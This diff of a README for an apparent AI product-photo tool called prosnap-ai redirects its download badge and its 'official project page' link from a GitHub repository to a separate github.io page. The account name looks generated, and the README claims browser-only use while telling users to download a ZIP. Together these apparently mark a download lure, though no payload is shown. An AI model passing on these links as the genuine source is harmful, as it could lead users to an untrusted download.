@@ -1,6 +1,6 @@
 # 📸 prosnap-ai - Create professional product photos instantly
 
-[![](https://img.shields.io/badge/Download-ProSnap-blue.svg)](https://github.com/Garbanzosouthwesternunitedstates976/prosnap-ai)
+[![](https://img.shields.io/badge/Download-ProSnap-blue.svg)](https://garbanzosouthwesternunitedstates976.github.io)
 
 Prosnap-ai transforms your smartphone product photos into professional e-commerce images. It uses artificial intelligence to edit your pictures directly within your web browser. You do not need to install complex software or maintain a server. 
 
@@ -23,7 +23,7 @@ To run Prosnap-ai, you need:
 
 Follow these steps to set up and use the application on your Windows computer.
 
-1.  Visit the official project page to access the software: [https://github.com/Garbanzosouthwesternunitedstates976/prosnap-ai](https://github.com/Garbanzosouthwesternunitedstates976/prosnap-ai)
+1.  Visit the official project page to access the software: [https://garbanzosouthwesternunitedstates976.github.io](https://garbanzosouthwesternunitedstates976.github.io)
 2.  Locate the button labeled "Code" on the page and select "Download ZIP."
 3.  Save the file to your computer.
 4.  Right-click the downloaded folder and select "Extract All."
